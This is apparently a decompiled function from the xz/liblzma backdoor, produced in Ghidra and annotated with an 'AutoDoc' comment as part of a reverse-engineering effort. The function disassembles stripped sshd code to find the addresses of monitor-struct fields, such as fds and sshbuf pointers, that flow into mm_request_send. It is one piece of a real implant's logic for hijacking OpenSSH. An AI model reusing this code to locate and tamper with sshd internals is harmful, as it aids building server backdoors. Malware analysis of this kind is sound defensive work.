// /home/kali/xzre-ghidra/xzregh/102FF0_sshd_find_monitor_field_addr_in_function.c
// Function: sshd_find_monitor_field_addr_in_function @ 0x102FF0
// Calling convention: unknown
// Prototype: undefined sshd_find_monitor_field_addr_in_function(void)


/*
 * AutoDoc: Sweeps a candidate sshd routine for MOV/LEA instructions that load a BSS slot into a
 * register, confirms that the pointer flows unmodified into a nearby call to `mm_request_send`,
 * and returns the underlying data-section address. The helper lets
 * `sshd_find_monitor_struct` recover individual monitor fields (send/recv fds, sshbuf pointers,
 * etc.) even when the surrounding function is stripped.
 */
#include "xzre_types.h"


void sshd_find_monitor_field_addr_in_function
               (ulong param_1,ulong param_2,ulong param_3,ulong param_4,ulong *param_5,long param_6)

{
  byte bVar1;
  int iVar2;
  byte bVar3;
  long lVar4;
  byte bVar5;
  ulong uVar6;
  long *plVar7;
  ulong uVar8;
  byte bVar9;
  ulong uVar10;
  long local_80;
  long local_78;
  undefined4 local_70;
  byte local_65;
  undefined4 local_64;
  byte local_60;
  int local_58;
  ulong local_50;
  
  *param_5 = 0;
  if (param_1 < param_2) {
    plVar7 = &local_80;
    for (lVar4 = 0x16; lVar4 != 0; lVar4 = lVar4 + -1) {
      *(undefined4 *)plVar7 = 0;
      plVar7 = (long *)((long)plVar7 + 4);
    }
    while (iVar2 = find_mov_lea_instruction(param_1,param_2,1,1,&local_80), iVar2 != 0) {
      uVar10 = 0;
      if (((local_70 & 0x100) != 0) && (uVar10 = local_50, (local_64 & 0xff00ff00) == 0x5000000)) {
        uVar10 = local_80 + local_50 + local_78;
      }
      bVar9 = 0;
      if ((local_70 & 0x1040) != 0) {
        if ((local_70 & 0x40) == 0) {
          bVar9 = local_70._1_1_ & 0x10;
          if (((local_70 & 0x1000) != 0) && (bVar9 = local_60, (local_70 & 0x20) != 0)) {
            bVar5 = local_65 << 3;
            goto LAB_001030d4;
          }
        }
        else {
          bVar9 = local_64._2_1_;
          if ((local_70 & 0x20) != 0) {
            bVar5 = local_65 * '\x02';
LAB_001030d4:
            bVar9 = bVar9 | bVar5 & 8;
          }
        }
      }
      param_1 = local_80 + local_78;
      if ((param_3 <= uVar10) && (uVar10 < param_4)) {
        uVar8 = param_1 + 0x40;
        if (*(ulong *)(param_6 + 0x60) < param_1 + 0x40) {
          uVar8 = *(ulong *)(param_6 + 0x60);
        }
        bVar5 = 0;
        bVar3 = 0;
        uVar6 = param_1;
LAB_00103110:
        do {
          while (iVar2 = x86_dasm(&local_80,uVar6,uVar8), iVar2 == 0) {
            uVar6 = uVar6 + 1;
LAB_0010325f:
            if (uVar8 <= uVar6) goto LAB_0010326b;
          }
          uVar6 = local_78 + local_80;
          if (local_58 == 0x109) {
            bVar1 = local_64._3_1_;
            if ((local_70 & 0x1040) == 0) {
              if ((local_70 & 0x40) != 0) goto LAB_00103237;
            }
            else if ((local_70 & 0x40) == 0) {
              bVar3 = local_70._1_1_ & 0x10;
              if (((local_70 & 0x1000) != 0) && (bVar3 = local_60, (local_70 & 0x20) != 0)) {
                bVar3 = local_60 | (local_65 & 1) << 3;
              }
            }
            else {
              bVar3 = local_64._2_1_;
              if ((local_70 & 0x20) != 0) {
                bVar3 = local_64._2_1_ | local_65 * '\x02' & 8;
              }
LAB_00103237:
              bVar5 = bVar1;
              if ((local_70 & 0x20) != 0) {
                bVar5 = bVar1 | (local_65 & 1) << 3;
              }
            }
          }
          else if (local_58 == 0x10b) {
            if ((local_70 & 0x40) == 0) {
              if ((local_70 & 0x1040) != 0) {
                bVar1 = local_60;
                if ((local_70 & 0x1000) != 0) goto LAB_00103237;
                bVar5 = local_70._1_1_ & 0x10;
                if (bVar9 != bVar3) goto LAB_0010325f;
                bVar5 = 0;
                bVar9 = local_70._1_1_ & 0x10;
                goto LAB_00103110;
              }
            }
            else if ((local_70 & 0x20) == 0) {
              bVar3 = local_64._3_1_;
              if ((local_70 & 0x1040) != 0) {
                bVar5 = local_64._2_1_;
              }
            }
            else {
              bVar3 = local_64._3_1_ | local_65 * '\b' & 8;
              if ((local_70 & 0x1040) != 0) {
                bVar5 = local_65 * '\x02' & 8 | local_64._2_1_;
              }
            }
          }
          if (bVar9 != bVar3) goto LAB_0010325f;
          bVar9 = bVar5;
        } while (bVar5 != 7);
        iVar2 = find_call_instruction
                          (local_78 + local_80,uVar8,
                           *(undefined8 *)(*(long *)(param_6 + 0x20) + 0xa8),&local_80);
        if (iVar2 != 0) {
          *param_5 = uVar10;
          return;
        }
      }
LAB_0010326b:
      if (param_2 <= param_1) {
        return;
      }
    }
  }
  return;
}

